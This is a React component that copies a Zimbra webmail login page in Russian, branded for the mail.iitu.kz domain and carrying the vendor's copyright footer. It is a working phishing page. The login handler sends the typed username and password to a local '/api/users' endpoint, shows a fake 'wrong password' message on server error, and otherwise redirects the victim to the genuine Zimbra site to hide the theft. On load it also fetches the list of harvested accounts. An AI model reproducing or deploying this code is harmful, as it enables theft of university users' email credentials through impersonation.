import React, { Component } from 'react';
import './App.css';
import logo from './assets/images/logo.jpg'
import errorLogo from './assets/images/error.png'


class App extends Component {

    state = {
        userId: '',
        userPassword: '',
        users: [],
        error: false,
    }


    componentDidMount = () => {
        fetch("/api/users")
            .then((res) => {
                return res.json();
            })
            .then((data) => {
                this.setState({
                    users: data
                })
            })
    }

    insertDb = () => {
            let userName = this.state.userId
            let userPassword = this.state.userPassword

            fetch('/api/users', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    userId: userName,
                    userPassword: userPassword
                })
            }).then((response) => {
                if(response.status === 500) {
                    this.setState({
                        userId: '',
                        userPassword: '',
                        error: true
                    })
                }else {
                    this.setState({
                        userId: '',
                        userPassword: '',
                        error: false
                    })
                    window.open("https://mail.iitu.kz/zimbra/", '_parent');

                }
            })

    }

    userIdHandler = (e) => {
        this.setState({
            userId: e.target.value
        })
    }

    userPasswordHandler = (e) => {
        this.setState({
            userPassword: e.target.value
        })
    }

  render() {
    return (
      <div className="App">
          <div className="main-part">
             <div className="contentBox">
                 <div className="logo-section">
                     <img src={logo} alt="logo" className={"logo-image"}/>
                 </div>
                 {this.state.error ?
                     <div className="error-block">
                         <img src={errorLogo} alt="error" className="error-image"/>
                         <p>Неверное имя пользователя или пароль.
                             Проверьте, не включен ли режим CAPS LOCK, и введите повторно
                             текущие имя пользователя и пароль.</p>
                     </div>
                 : null}
                 <div className="form-section">
                     <div className={"form"}>
                         <div className="userInput">
                             <p className={"input-text"} style={{marginTop: 0, marginBottom: 0}}>Имя пользователя:</p>
                             <input type="text"
                                    name="userid"
                                    id="userid"
                                    className={"form-input"}
                                    value={this.state.userId}
                                    onChange={(event) => this.userIdHandler(event)}/>
                         </div>
                         <div className="userInput">
                             <p className={"input-text"}>Пароль</p>
                             <input type="password"
                                    name="password"
                                    id="password"
                                    className={"form-input"}
                                    value={this.state.userPassword}
                                    onChange={(event) => this.userPasswordHandler(event)}/>
                         </div>
                         <div className="checker-wrapper">
                             <input type="checkbox"  id="password" name={"remember"}/>
                             <label htmlFor="remember">Запомнить меня</label>
                             <input type="submit" className={"submitButton"} onClick={() => this.insertDb()} value={"Вход"}/>
                         </div>
                         <hr className={"line-braker"}/>
                         <div className={"version"}>
                             <div className="userInput">
                                 <p className={"input-text"}>Версия:</p>
                                 <div>
                                     <select name="client" id="client" className={"form-select"}>
                                         <option>По умолчанию</option>
                                         <option>Расширенный (AJAX)</option>
                                         <option>Стандартный (HTML)</option>
                                         <option>Мобильный телефон</option>
                                     </select>
                                     <label htmlFor="client"><a href="https://www.google.com" style={{color: 'white', fontSize: '10px', textDecoration: 'none' }}>Что это такое?</a></label>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
          </div>
          <div className="footer">
              <p>Zimbra :: лидер open source-программ для обмена сообщениями и групповой работы :: Блог — Вики — Форумы</p>
              <p className="footer-last">Copyright	&#169; 2005-2016 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
          </div>
      </div>
    );
  }
}

export default App;
